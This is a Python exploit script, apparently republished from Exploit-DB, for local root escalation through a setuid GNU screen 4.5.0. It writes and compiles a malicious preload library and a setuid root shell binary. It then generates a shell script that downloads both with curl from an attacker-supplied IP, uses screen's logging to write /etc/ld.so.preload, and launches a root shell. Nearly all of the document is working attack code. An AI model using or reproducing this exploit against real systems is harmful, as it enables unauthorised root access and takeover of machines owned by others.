# Exploit Title: local pivilege escalation exploit
# Exploit Author: 34ZY (https://github.com/34zY) updated from https://www.exploit-db.com/exploits/41154
# Version: setuid screen v4.5.0
# Tested on: Ubuntu
# CVE : N/A

# Require : pip install argparse / gcc

import os,argparse

def main(args): 

	IP_ADDRESS = args.ipaddress
	#print(IP_ADDRESS)

	print('[+] Building libhax template ...')

	with open('libhax.c', 'w') as f:
		f.write("""#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\\n");
}
		""")
	f.close()

	print('[+] Building rootshell template ...')

	with open('rootshell.c', 'w') as f:
		f.write("""#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}""")

	f.close()
	
	print('[+] Compiling library and rooshell binary statically.')
	try:
		os.system('gcc -o rootshell rootshell.c -static 2>/dev/null')
		os.system('gcc -fPIC -shared -ldl -o libhax.so libhax.c 2>/dev/null')
	except:
		os.system('gcc -o rootshell rootshell.c -static')
		os.system('gcc -fPIC -shared -ldl -o libhax.so libhax.c')

	# Cleaning
	os.remove('rootshell.c')
	os.remove("libhax.c")

	# Continue
	print ('[+] Artifacts successfully generated !')
	print('[+] Generating exploit.sh script to download and execute artifacts ...')
	print('[+] Script exploit.sh successfully generated !')

	with open('exploit.sh' , 'w') as f:
		
		f.write(f'''#!/bin/sh
curl http://{IP_ADDRESS}/rootshell -o /tmp/rootshell
curl http://{IP_ADDRESS}/libhax.so -o /tmp/libhax.so
cd /etc
umask 000
screen -D -m -L ld.so.preload echo -ne  "\\x0a/tmp/libhax.so" 
screen -ls
/tmp/rootshell''')

	print("""\n[*******************] \n[*** Instruction ***] 

Upload exploit.sh to download and execute artifacts on target machine and do this 
to trigger your shell \n\n[*******************]""")


if __name__ == '__main__':

	msg = """Usage: python exploit.py -i SERVER_ATTACKER_IP"""
	
	# Initialize parser
	parser = argparse.ArgumentParser(description = msg)
	parser.add_argument('ipaddress')
	args = parser.parse_args()	
	main(args)
